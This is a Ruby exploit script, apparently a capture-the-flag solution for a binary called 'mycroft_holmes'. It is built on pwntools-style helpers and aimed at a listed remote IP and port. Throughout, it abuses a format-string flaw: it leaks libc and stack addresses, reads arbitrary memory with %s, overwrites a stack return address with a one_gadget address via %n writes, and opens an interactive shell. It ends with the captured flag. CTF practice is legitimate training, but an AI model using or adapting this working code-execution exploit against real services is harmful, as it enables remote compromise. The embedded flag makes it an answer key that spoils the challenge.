#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/ruby-pwntools
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

@magic = one_gadget(file: './libc.so.6')[0]

host, port = '146.185.168.172', 14273
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'mycroft_holmes'
def h;@h ||= heapinfo(@p); @h.reload!;end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug
def pt; z.recvuntil '>>> '; end
z.puts 's'

pt
z.puts 'help %5$lx|%6$lx|aaaa'
libc,stack,_ = z.recvuntil('aaaa').split('|').map { |c| c.to_i(16) }
libc -= 0x5ea700 - (@local ? 0 : 1) * 0x1000
h.offset(libc, :libc)
h.offset(stack)
log.info("libc #{libc.hex}")
log.info("stack #{stack.hex}")
def leak(addr)
  pt
  z.puts "help #{'a' * 11}%161$sbb#{p64(addr)}"
  z.recvuntil 'a' * 11
  z.recvuntil('bb')[0..-3] + "\x00"
end
p (leak(0x604040)+"\x00").u64.hex
target = libc + @magic
target = target.p64
cur = 0
payload = ''
8.times do |i|
  v = target[i].ord
  nd = v - cur + 256
  nd %= 256
  nd = 256 if nd == 0
  payload += "%#{nd}c%#{174 + i}$n"
  cur = v
end
fail if payload.size >= 123
payload = payload.ljust(123, 'A')
8.times do |i|
  payload += p64(stack - 328 + i)
end
# gets
z.puts 'help ' + payload

z.interact
# ASIS{HuntIng_1s_n0t_g00d_Unless_You_Hunt_Bug3!}
